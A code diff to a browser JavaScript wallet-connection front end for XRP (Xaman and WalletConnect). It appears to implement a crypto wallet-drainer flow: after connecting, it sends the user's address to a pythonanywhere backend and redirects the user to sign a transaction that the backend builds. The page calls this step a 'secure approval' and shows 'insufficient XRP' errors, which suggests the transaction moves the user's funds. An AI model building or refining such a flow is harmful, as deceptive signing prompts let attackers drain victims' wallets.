@@ -1,7 +1,7 @@
 // ==============================
 // CONFIG
 // ==============================
-const BACKEND_URL = "https://cultured.pythonanywhere.com";
+const BACKEND_URL = "https://cultured.pythonanywhere.com/"; // <-- CHANGE THIS
 const WC_PROJECT_ID = "YOUR_PROJECT_ID";
 
 // ==============================
@@ -43,11 +43,24 @@ async function connectWallet(type) {
   try {
     setStatus("Connecting…");
 
-    // ❌ NO XAMAN SDK HERE ANYMORE
     if (type === "xaman") {
-      setStatus("Enter your XRP address to continue");
-      return;
-    }
+	  const xumm = new XummPkce();
+
+	  xumm.on("success", async () => {
+		const state = await xumm.state();
+		if (state?.me?.account) {
+		  handlePostConnect("xaman", state.me.account);
+		}
+	  });
+
+	  xumm.on("error", err => {
+		console.error("Xaman connect error:", err);
+		setStatus("Xaman connection cancelled");
+	  });
+
+	  await xumm.authorize(); // opens Xaman, NO redirect required
+	}
+
 
     if (type === "walletconnect") {
       await initWalletConnect();
@@ -59,15 +72,6 @@ async function connectWallet(type) {
     console.error(err);
     setStatus("Connection failed");
   }
-}
-
-// Manual address capture (use from input field)
-function connectXamanAddress(address) {
-  if (!address || !address.startsWith("r")) {
-    setStatus("Invalid XRP address");
-    return;
-  }
-  handlePostConnect("xaman", address);
 }
 
 function handlePostConnect(type, address) {
@@ -82,13 +86,10 @@ function handlePostConnect(type, address) {
 }
 
 // ==============================
-// SECURE TRANSFER (BACKEND → XAMAN)
+// SECURE TRANSFER (BACKEND)
 // ==============================
 async function triggerManualApproval() {
-  if (!currentAddress) {
-    setStatus("Connect wallet first");
-    return;
-  }
+  if (!currentAddress) return;
 
   try {
     setStatus("Preparing secure approval…");
@@ -99,12 +100,14 @@ async function triggerManualApproval() {
       body: JSON.stringify({ address: currentAddress })
     });
 
+    // 🔴 ADD THIS BLOCK RIGHT HERE
     if (!res.ok) {
       const err = await res.json();
       setStatus(err.detail || "Wallet has insufficient XRP");
       return;
     }
 
+    // ✅ Only parse success responses
     const data = await res.json();
 
     if (!data.signUrl) {
@@ -112,7 +115,7 @@ async function triggerManualApproval() {
       return;
     }
 
-    // 🔐 ONLY place Xaman opens
+    // 🔐 Redirect directly (NO popup tricks)
     window.location.href = data.signUrl;
 
   } catch (err) {
@@ -141,12 +144,6 @@ async function initWalletConnect() {
     standaloneChains: ["xrpl:0"]
   });
 }
-
-document.addEventListener("DOMContentLoaded", () => {
-  const knownAddress = "rXXXXXXXXXXXXXXXXXXXXXXXXXXXX";
-  connectXamanAddress(knownAddress);
-});
-
 
 async function connectViaWalletConnect() {
   const { uri, approval } = await wcClient.connect({
